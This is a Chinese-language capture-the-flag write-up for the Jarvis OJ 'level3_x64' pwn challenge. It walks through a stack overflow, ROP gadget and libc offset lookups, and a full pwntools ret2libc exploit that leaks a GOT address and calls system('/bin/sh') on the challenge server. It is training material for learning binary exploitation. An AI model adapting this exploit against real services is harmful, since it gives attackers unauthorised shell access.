# Jarvisoj--pwn--level3&level3_x64

32位和64位思路一样，我们用64位来玩

checksec一下

    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)


打开ida查看一波

```c++
int __cdecl main(int argc, const char **argv, const char **envp)
{
  vulnerable_function();
  return write(1, "Hello, World!\n", 0xEuLL);
}
```

进入vulnerable_function

```c++
ssize_t vulnerable_function()
{
  char buf; // [rsp+0h] [rbp-80h]

  write(1, "Input:\n", 7uLL);
  return read(0, &buf, 0x200uLL);
}
```

此处存在栈溢出。

## 利用思路

利用write函数把got表中read函数的地址暴露出来，配合libc文件求偏移值，然后把system和‘/bin/sh’的真实地址求出，利用read函数把system("/bin/sh") 写进栈的返回地址。

### 第一步 求read函数的地址

```
0000000000000080 buf             db ?
-000000000000007F                 db ? ; undefined
-000000000000007E                 db ? ; undefined
.....................................
-0000000000000002                 db ? ; undefined
-0000000000000001                 db ? ; undefined
+0000000000000000  s              db 8 dup(?)
+0000000000000008  r              db 8 dup(?)
+0000000000000010
+0000000000000010 ; end of stack variables
```

可见我们要构造的payload = ’a' * (0x80 + 8) + rdi + p64(1) + rsi,r15 + read_got + p64(8) + write_plt + vulnerable_function

(32位  则不需要rdi rsi

​	payload = ’a' * (0x88 + 4) + write_plt + vulnerable_function + p32(1) + p32(read_got) + p32(4)

)

利用ROPgadget 找到 rdi 和 rsi r15的地址

```
root@kali:~/下载/level3_x64# ROPgadget --binary ./level3_x64 --only "pop|ret"
Gadgets information
============================================================
0x00000000004006ac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006ae : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006b0 : pop r14 ; pop r15 ; ret
0x00000000004006b2 : pop r15 ; ret
0x00000000004006ab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006af : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400550 : pop rbp ; ret
0x00000000004006b3 : pop rdi ; ret
0x00000000004006b1 : pop rsi ; pop r15 ; ret
0x00000000004006ad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400499 : ret

Unique gadgets found: 11
```



### 第二步 利用libc偏移求出system 和 '/bin/sh' 的地址

libc相关函数和字符串地址

```
root@kali:~/下载/level3_x64# readelf -a ./libc-2.19.so |grep "read@@"
   534: 00000000000eb6a0    90 FUNC    WEAK   DEFAULT   12 __read@@GLIBC_2.2.5
   657: 00000000000794d0    27 FUNC    GLOBAL DEFAULT   12 _IO_file_read@@GLIBC_2.2.5
   883: 00000000000eb6a0    90 FUNC    WEAK   DEFAULT   12 read@@GLIBC_2.2.5
  1082: 00000000000ef610  1691 FUNC    GLOBAL DEFAULT   12 fts_read@@GLIBC_2.2.5
  1175: 00000000000fa710    31 FUNC    GLOBAL DEFAULT   12 eventfd_read@@GLIBC_2.7
  1574: 000000000006e7e0   320 FUNC    WEAK   DEFAULT   12 fread@@GLIBC_2.2.5
  2021: 00000000000cb540    96 FUNC    WEAK   DEFAULT   12 pread@@GLIBC_2.2.5
  2137: 000000000006e7e0   320 FUNC    GLOBAL DEFAULT   12 _IO_fread@@GLIBC_2.2.5
root@kali:~/下载/level3_x64# readelf -a ./libc-2.19.so |grep "system@@"
   577: 0000000000046590    45 FUNC    GLOBAL DEFAULT   12 __libc_system@@GLIBC_PRIVATE
  1337: 0000000000046590    45 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.2.5
root@kali:~/下载/level3_x64# strings -a -t x libc-2.19.so |grep "/bin/sh"
 17c8c3 /bin/sh
```

求出read的地址后，与libc文件里的read地址相减得出 偏移值

offset = read_adr - read_libc

system_adr = system_libc + offset

bin_adr = bin_sh_libc + offset

### 第三步 构造payload并写进栈

payload = ’a' * (0x80 + 8) + rdi + bin_adr  + system_adr + vulnerable_function

(32位

  payload = ’a' * (0x88 + 4) + system_adr + vulnerable_function + bin_adr

)

exp:

```
from pwn import *

r = remote("pwn2.jarvisoj.com",9883)
e = ELF("./level3_x64")

write_plt = e.plt["write"]
read_got = e.got["read"]
func = e.symbols["vulnerable_function"]
rdi_ret = 0x4006b3
rsi_ret = 0x4006b1

payload1 = "A" * (0x80 + 8) 
payload1 += p64(rdi_ret) + p64(1) + p64(rsi_ret) + p64(read_got) + p64(256) + p64(write_plt) + p64(func)

r.recvline()
r.send(payload1)

readadr = u64(r.recv(8))
print(hex(readadr))

libc_read = 0x00000000000eb6a0
offset = readadr - libc_read
sysadr = offset + 0x046590
bshadr = offset + 0x17c8c3

payload2 = "A" * (0x80 + 8) + p64(rdi_ret) + p64(bshadr) + p64(sysadr) + p64(0xdeadbeef)

r.recvline()
r.send(payload2)
r.interactive()
```

